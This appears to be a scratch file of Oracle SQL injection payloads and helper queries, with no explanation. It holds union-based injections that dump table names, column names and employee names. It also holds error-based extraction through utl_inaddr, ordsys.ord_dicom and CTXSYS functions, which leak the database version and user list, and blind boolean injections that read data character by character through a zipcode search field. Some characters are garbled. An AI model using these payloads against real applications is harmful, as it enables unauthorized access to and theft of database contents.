1' or '1'='1' order by 7--;
1' or '1'='1' union select 1,null,null,null,null,null from dual --;
1' or '1'='1' union select 1,'a','b','c','d','e' from dual --;

1' or '1'='1' union select 1,table_name,'b','c','d','e' from user_tables --;



select * from user_tables;

select column_name from all_tab_columns where table_name='EMPLOYEES' or 1=utl_inaddr.get_host_address((select sys.stragg (distinct username||chr(32)) from all_users));

select column_name from all_tab_columns where table_name='EMPLOYEES' or 1 = ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user);
select banner from v$version where rownum=1;
select TABLE_NAME from (select rownum as rnum,TABLE_NAME from user_tables) where rnum=2;
select column_name from all_tab_columns where table_name='EMPLOYEES' or 1 = ordsys.ord_dicom.getmappingxpath((select TABLE_NAME from (select rownum as rnum,TABLE_NAME from user_tables) where rnum=2),user,user);
select COLUMN_NAME from (select rownum as rnum,COLUMN_NAME from all_tab_columns where table_name='DEPARTMENTS') where rnum=2;
select column_name from all_tab_columns where table_name='EMPLOYEES' or 1 = ordsys.ord_dicom.getmappingxpath((select COLUMN_NAME from (select rownum as rnum,COLUMN_NAME from all_tab_columns where table_name='DEPARTMENTS') where rnum=2),user,user);
select COLUMN_NAME from (select rownum as rnum,COLUMN_NAME from all_tab_columns where table_name='DEPARTMENTS') where rnum=2;
select DEPARTMENT_NAME from (select rownum as rnum,DEPARTMENT_NAME from DEPARTMENTS) where rnum=2;
select column_name from all_tab_columns where table_name='EMPLOYEES' or 1 = ordsys.ord_dicom.getmappingxpath((select DEPARTMENT_NAME from (select rownum as rnum,DEPARTMENT_NAME from DEPARTMENTS) where rnum=2),user,user);


select column_name from all_tab_columns where table_name='EMPLOYEES' or 1= CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1));

select * from all_tab_columns ;

select column_name from (select column_name,table_name as a from all_tab_columns) where a='EMPLOYEES';


1' or '1'='1' union select 1,column_name,'b','c','d','e' from all_tab_columns where table_name='EMPLOYEES' --;

1' or '1'='1' union select 1,first_name,'b','c',last_name,'e' from employees where table_name='EMPLOYEES' --;

1' or '1'='1' union  select 1,first_name,'b','c',last_name,'e' from employees --;


1' or '1'='1' union select 1,first_name,'b','c',last_name,'e' from (select rownum as rnum,first_name,last_name from employees) where rnum<5 --;



select * from zipcode where dong like '%â��%' and (select ascii((select substr((select TABLE_NAME from (select rownum as rnum,TABLE_NAME from user_tables) where rnum=2),2,1) from dual)) from dual)=69--%'

select * from zipcode where dong like '%â��%' and (select ascii((select substr((select COLUMN_NAME from (select rownum as rnum,COLUMN_NAME from all_tab_columns where table_name='DEPARTMENTS') where rnum=2),2,1) from dual)) from dual)=69--%'

â��%' and (select ascii((select substr((select COLUMN_NAME from (select rownum as rnum,COLUMN_NAME from all_tab_columns where table_name='DEPARTMENTS') where rnum=2),2,1) from dual)) from dual)=69--


select COLUMN_NAME from (select rownum as rnum,COLUMN_NAME from all_tab_columns where table_name='DEPARTMENTS') where rnum=2;


â��%' and (select ascii((select substr((select DEPARTMENT_NAME from (select rownum as rnum,DEPARTMENT_NAME from DEPARTMENTS) where rnum=2),2,1) from dual)) from dual)=69--


select DEPARTMENT_NAME from (select rownum as rnum,DEPARTMENT_NAME from DEPARTMENTS) where rnum=2;

â��%' and (select ascii((select substr((select DEPARTMENT_NAME from (select rownum as rnum,DEPARTMENT_NAME from DEPARTMENTS) where rnum=1),1,1) from dual)) from dual)>77--;

select * from zipcode where dong like '%â��%' and (select ascii((select substr((select DEPARTMENT_NAME from (select rownum as rnum,DEPARTMENT_NAME from DEPARTMENTS) where rnum=2),1,1) from dual)) from dual)=77--%'


